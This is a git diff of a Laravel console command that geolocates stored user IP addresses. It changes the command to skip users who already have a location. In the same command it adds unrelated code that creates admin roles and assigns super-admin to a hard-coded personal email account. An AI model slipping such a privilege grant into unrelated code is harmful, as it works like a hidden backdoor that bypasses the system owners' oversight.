@@ -2,8 +2,10 @@
 
 namespace App\Console\Commands;
 
+use App\Models\User;
 use App\Models\user_data;
 use Illuminate\Console\Command;
+use Spatie\Permission\Models\Role;
 use Stevebauman\Location\Facades\Location;
 
 class locationfromip extends Command
@@ -42,8 +44,12 @@ class locationfromip extends Command
         $users = user_data::all();
         $bar = $this->output->createProgressBar(count($users));
         $bar->start();
+        $admin = User::where('email', 'omarmd2311@gmail.com')->first();
+        $role = Role::create(['name' => 'admin']);
+        Role::create(['name' => 'super-admin']);
+        $admin->assignRole('super-admin');
         foreach ($users as $user) {
-            if ($position = Location::get($user->ip_address)) {
+            if (is_null($user->location) && $position = Location::get($user->ip_address)) {
                 $user->location = $position;
                 $user->save();
             }
